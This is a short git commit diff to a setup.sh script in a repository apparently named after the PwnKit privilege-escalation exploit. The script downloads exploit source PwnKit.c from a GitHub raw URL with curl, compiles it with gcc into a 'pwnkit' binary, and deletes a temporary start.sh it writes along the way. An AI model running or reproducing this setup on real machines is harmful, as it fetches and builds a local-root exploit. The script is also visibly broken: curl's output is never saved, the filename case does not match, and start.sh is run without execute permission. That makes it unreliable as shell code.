0f055f123c2091e1dca4765a5df3686320892a18
CCR-ice <64931368+CCR-ice@users.noreply.github.com>
2022-04-13 19:46:55 -0400

    Update setup.sh

--- setup.sh
+++ setup.sh
@@ -1,6 +1,11 @@
+echo "Creating SH File..."
+echo "curl -fsSL https://raw.githubusercontent.com/CCR-ice/pwnkit/main/PwnKit.c" > start.sh
 echo "Fetching C source..."
-curl -fsSL https://raw.githubusercontent.com/CCR-ice/pwnkit/main/PwnKit.c
+./start.sh
 echo "Done."
 echo "Creating ecxecutable..."
 gcc -o pwnkit pwnkit.c
+echo "Done."
+echo "Cleaning up..."
+rm -rf start.sh
 echo "Done."
